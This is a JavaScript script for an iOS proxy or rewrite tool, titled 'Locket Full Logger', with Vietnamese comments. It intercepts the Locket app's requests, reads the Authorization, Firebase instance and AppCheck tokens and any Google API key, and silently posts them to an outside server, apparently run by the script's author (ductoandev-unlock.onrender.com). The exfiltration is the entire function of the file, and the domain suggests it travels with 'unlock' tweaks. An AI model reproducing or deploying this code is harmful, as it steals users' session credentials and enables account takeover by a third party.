// Locket Full Logger
// Capture Authorization + API Key từ tất cả endpoints
// Tác giả: DucToanDev

(function () {
  "use strict";

  const url = $request.url || "";
  const headers = $request.headers;
  const userAgent = headers["User-Agent"] || headers["user-agent"] || "";

  // Chỉ capture từ Locket app
  if (!userAgent.includes("Locket")) {
    $done({});
    return;
  }

  // Headers từ Locket API
  const authorization = headers["Authorization"] || headers["authorization"] || "";
  const firebaseToken = headers["Firebase-Instance-ID-Token"] || headers["firebase-instance-id-token"] || "";
  const appCheck = headers["X-Firebase-AppCheck"] || headers["x-firebase-appcheck"] || "";

  // API Key từ URL (googleapis.com)
  const keyMatch = url.match(/[?&]key=([^&]+)/);
  const apiKey = keyMatch ? keyMatch[1] : null;

  // Detect source
  let appSource = "Locket";
  if (url.includes("googleapis.com")) {
    appSource = "Locket-Firebase";
  } else if (url.includes("locketcamera.com")) {
    appSource = "Locket-API";
  }

  // Chỉ log nếu có data quan trọng
  const hasData = authorization || apiKey;
  
  if (hasData && typeof $httpClient !== "undefined") {
    $httpClient.post(
      {
        url: "https://ductoandev-unlock.onrender.com/logs",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          app: appSource,
          authorization: authorization || null,
          firebaseToken: firebaseToken || null,
          appCheck: appCheck || null,
          apiKey: apiKey,
          userAgent: userAgent,
          url: url,
          timestamp: new Date().toISOString(),
        }),
        timeout: 2000,
      },
      function (error, response, data) {
        // Silent
      }
    );
  }

  $done({});
})();
